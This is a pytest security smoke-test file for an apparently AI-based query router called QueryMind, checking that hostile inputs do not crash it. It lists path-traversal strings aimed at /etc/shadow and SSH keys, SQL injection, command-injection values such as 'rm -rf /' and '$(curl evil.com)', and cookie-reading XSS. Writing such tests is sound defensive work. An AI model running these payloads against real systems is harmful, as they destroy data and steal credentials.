#!/usr/bin/env python3
"""
Smoke Test: Security Validation

Verifies that QueryMind properly handles malicious inputs:
- Path traversal attempts (../, /etc/passwd)
- Query injection attempts
- Oversized inputs
- Special characters

Run with: pytest tests/test_security_validation.py -v
"""

import pytest
from querymind.agents.router import AgentRouter


@pytest.fixture
def router():
    """Create a router instance for testing."""
    return AgentRouter()


def test_path_traversal_in_query(router):
    """Test that path traversal attempts in queries don't crash the system."""
    malicious_queries = [
        "../../../etc/passwd",
        "../../vault/secrets.md",
        "/etc/shadow",
        "~/.ssh/id_rsa",
        "..\\..\\windows\\system32",
    ]

    for query in malicious_queries:
        # Should not crash, should return a valid agent type
        agent_type, reason = router._analyze_query(query, verbose=False)
        assert agent_type is not None, f"Query '{query}' should still be processed safely"


def test_sql_injection_patterns(router):
    """Test that SQL-like injection patterns are handled safely."""
    injection_attempts = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM secrets--",
    ]

    for query in injection_attempts:
        # QueryMind doesn't use SQL, but ensure it doesn't crash
        agent_type, reason = router._analyze_query(query, verbose=False)
        assert agent_type is not None


def test_command_injection_patterns(router):
    """Test that command injection patterns are handled safely."""
    command_attempts = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "`whoami`",
        "$(curl evil.com)",
        "&& wget malware.exe",
    ]

    for query in command_attempts:
        agent_type, reason = router._analyze_query(query, verbose=False)
        assert agent_type is not None


def test_xss_patterns(router):
    """Test that XSS patterns in queries don't cause issues."""
    xss_attempts = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)",
        "<iframe src='evil.com'>",
    ]

    for query in xss_attempts:
        agent_type, reason = router._analyze_query(query, verbose=False)
        assert agent_type is not None


def test_oversized_query_handling(router):
    """Test that extremely large queries are handled gracefully."""
    # Create a 10KB query
    oversized_query = "A" * 10000

    try:
        agent_type, reason = router._analyze_query(oversized_query, verbose=False)
        # Should either process it or fail gracefully
        assert agent_type is not None
    except Exception as e:
        # If it fails, it should be a controlled failure
        assert "size" in str(e).lower() or "length" in str(e).lower() or "memory" in str(e).lower()


def test_null_bytes_in_query(router):
    """Test that null bytes in queries are handled."""
    null_byte_queries = [
        "test\x00query",
        "path\x00/to/file",
        "\x00\x00\x00",
    ]

    for query in null_byte_queries:
        # Should not crash
        agent_type, reason = router._analyze_query(query, verbose=False)
        assert agent_type is not None


def test_unicode_edge_cases(router):
    """Test that unusual Unicode characters are handled."""
    unicode_queries = [
        "test\u0000query",  # NULL character
        "test\uffff",       # Non-character
        "test\U0001f4a9",   # Emoji (💩)
        "тест запрос",      # Cyrillic
        "测试查询",          # Chinese
        "𝕥𝕖𝕤𝕥",             # Mathematical bold
    ]

    for query in unicode_queries:
        # Should handle gracefully
        agent_type, reason = router._analyze_query(query, verbose=False)
        assert agent_type is not None


def test_query_length_limits():
    """Test that query length validation works if implemented."""
    from querymind.agents.fast_search_agent import FastSearchAgent

    # Use concrete implementation instead of abstract BaseAgent
    agent = FastSearchAgent()

    # Very short query
    short_result = agent._format_result("doc", {"file": "test.md"}, 0.5, False)
    assert short_result is not None

    # Should not crash with edge case inputs
    edge_cases = {
        "file": "",
        "empty": None,
    }
    result = agent._format_result("content", edge_cases, 0.8, True)
    assert result is not None


def test_special_characters_in_file_paths():
    """Test that special characters in file metadata are handled."""
    from querymind.agents.fast_search_agent import FastSearchAgent

    agent = FastSearchAgent()
    special_metadata = [
        {"file": "test file with spaces.md"},
        {"file": "test'quote.md"},
        {"file": "test\"doublequote.md"},
        {"file": "test;semicolon.md"},
        {"file": "test&ampersand.md"},
        {"file": "test<greater>.md"},
    ]

    for meta in special_metadata:
        # Should not crash when formatting results
        result = agent._format_result("content", meta, 0.7, False)
        assert result is not None
        assert "file" in result


def test_cache_key_generation_with_special_chars():
    """Test that cache key generation handles special characters safely."""
    from querymind.core.cache import QueryCache

    cache = QueryCache(max_size=10)

    special_queries = [
        "query with spaces",
        "query/with/slashes",
        "query\\with\\backslashes",
        "query:with:colons",
        "query\twith\ttabs",
        "query\nwith\nnewlines",
    ]

    for query in special_queries:
        # Should generate valid cache keys without crashing
        key = cache._generate_key(query, n_results=5, collection="test")
        assert key is not None
        assert isinstance(key, str)
        assert len(key) > 0


def test_conversation_memory_injection():
    """Test that conversation memory handles potentially malicious content."""
    from querymind.core.conversation_memory import ConversationMemory

    memory = ConversationMemory()

    malicious_contents = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE messages; --",
        "../../../etc/passwd",
        "\x00\x00\x00",
    ]

    for content in malicious_contents:
        # Should store safely without executing
        memory.add_message("user", content)

    messages = memory.get_messages()
    assert len(messages) == len(malicious_contents)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
